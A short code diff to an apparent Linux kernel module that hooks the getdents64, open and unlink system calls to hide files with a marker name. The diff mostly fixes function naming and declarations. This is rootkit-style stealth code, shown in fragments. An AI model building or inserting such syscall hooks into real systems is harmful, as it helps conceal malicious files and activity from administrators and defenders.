@@ -24,7 +24,7 @@ asmlinkage long (*kernel_unlink)(const char __user *pathname);
 // Hooked system call
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
-asmlinkage long hooked__unlink(const char __user *pathname);
+asmlinkage long hooked_unlink(const char __user *pathname);
 
 /*************** What file we gonna hide ********************/
 char *INEXISTFILE = "HIDEAFILEINKERNEL";
@@ -137,7 +137,7 @@ asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode
     return kernel_open(filename, flags, mode);
 }
 
-asmlinkage long (*kernel_unlink)(const char __user *filename){
+asmlinkage long hooked_unlink(const char __user *filename){
     char *tmp;
     printk("hhh %s\n", filename);
     //Hide a new type of file
